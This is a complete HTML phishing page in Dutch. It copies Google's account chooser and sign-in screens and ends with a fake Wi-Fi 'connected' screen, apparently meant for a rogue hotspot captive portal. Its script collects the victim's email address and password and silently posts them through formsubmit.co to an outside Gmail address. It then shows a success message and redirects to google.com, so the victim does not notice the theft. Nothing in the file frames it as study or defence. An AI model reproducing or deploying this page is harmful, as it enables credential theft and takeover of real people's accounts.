<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inloggen - Google-accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 450px; min-height: 500px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3); }
        @media (max-width: 450px) { .container { border: none; padding: 24px; min-height: 100vh; box-shadow: none; } }
        .google-logo { height: 24px; margin-bottom: 12px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px 0; }
        p { font-size: 16px; color: #202124; margin: 0 0 25px 0; }
        
        /* Account Picker Items */
        .account-item { display: flex; align-items: center; padding: 12px 0; border-bottom: 1px solid #dadce0; cursor: pointer; text-align: left; }
        .account-item:hover { background: #f8f9fa; }
        .avatar-circle { width: 36px; height: 36px; background: #f1f3f4; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px; color: #5f6368; font-weight: 500; }
        .acc-info { flex-grow: 1; }
        .acc-name { font-size: 14px; font-weight: 500; color: #3c4043; }

        /* Inputs */
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; margin-bottom: 10px; }
        input:focus { border: 2px solid #1a73e8; }
        
        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: auto; padding-top: 30px; }
        .blue-link { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; background: none; border: none; }
        button.next-btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }

        .progress { position: absolute; top: 0; left: 0; width: 0%; height: 4px; background: #1a73e8; transition: width 0.4s; }
        #emailStep, #passStep, #wifiStep { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div id="loader" class="progress"></div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo">
        
        <div id="pickerStep">
            <h1>Account kiezen</h1>
            <p>om door te gaan naar Google</p>
            <div class="account-item" onclick="showEmailStep()">
                <div class="avatar-circle">👤</div>
                <div class="acc-info">
                    <div class="acc-name" style="color:#1a73e8;">Een ander account gebruiken</div>
                </div>
            </div>
            <div class="footer" style="justify-content: center;">
                <p style="font-size:12px; color:#5f6368;">Om door te gaan, controleert Google of dit account van jou is.</p>
            </div>
        </div>

        <div id="emailStep">
            <h1>Inloggen</h1>
            <p>Gebruik je Google-account</p>
            <input type="email" id="emailInput" placeholder="E-mailadres of telefoonnummer">
            <div style="text-align: left;"><button class="blue-link" onclick="window.open('https://accounts.google.com/signin/usernamerecovery')">E-mailadres vergeten?</button></div>
            <div class="footer">
                <button class="blue-link" onclick="window.open('https://accounts.google.com/signup')">Account maken</button>
                <button class="next-btn" onclick="toPassword()">Volgende</button>
            </div>
        </div>

        <div id="passStep">
            <h1>Welkom</h1>
            <div style="display:inline-flex; align-items:center; border:1px solid #dadce0; padding:4px 12px; border-radius:20px; margin-bottom:20px;">
                <span id="displayEmail" style="font-size:14px;"></span>
            </div>
            
            <form id="mainForm" action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST">
                <input type="hidden" name="email" id="hiddenEmail">
                <input type="password" name="password" id="passInput" placeholder="Wachtwoord opgeven" required>
                <div class="footer">
                    <button type="button" class="blue-link" onclick="window.open('https://accounts.google.com/signin/recovery')">Wachtwoord vergeten?</button>
                    <button type="submit" class="next-btn">Volgende</button>
                </div>
            </form>
        </div>

        <div id="wifiStep">
            <div style="font-size: 50px; color:#1e8e3e; margin: 30px 0;">✓</div>
            <h1>Verbonden</h1>
            <p>U bent nu aangemeld. U wordt nu doorverwezen naar het internet.</p>
            <button class="next-btn" style="width:100%;" onclick="window.location.href='https://google.com'">Ga verder</button>
        </div>
    </div>

    <script>
        const loader = document.getElementById('loader');

        function showEmailStep() {
            document.getElementById('pickerStep').style.display = 'none';
            document.getElementById('emailStep').style.display = 'block';
        }

        function toPassword() {
            const email = document.getElementById('emailInput').value;
            if(!email.includes('@')) return;
            loader.style.width = "100%";
            setTimeout(() => {
                document.getElementById('emailStep').style.display = 'none';
                document.getElementById('passStep').style.display = 'block';
                document.getElementById('displayEmail').innerText = email;
                document.getElementById('hiddenEmail').value = email;
                loader.style.width = "0%";
            }, 800);
        }

        document.getElementById('mainForm').addEventListener('submit', function(e) {
            e.preventDefault();
            loader.style.width = "100%";
            fetch(this.action, { method: 'POST', body: new FormData(this) }).then(() => {
                document.getElementById('passStep').style.display = 'none';
                document.getElementById('wifiStep').style.display = 'block';
                loader.style.width = "0%";
            });
        });
    </script>
</body>
</html>
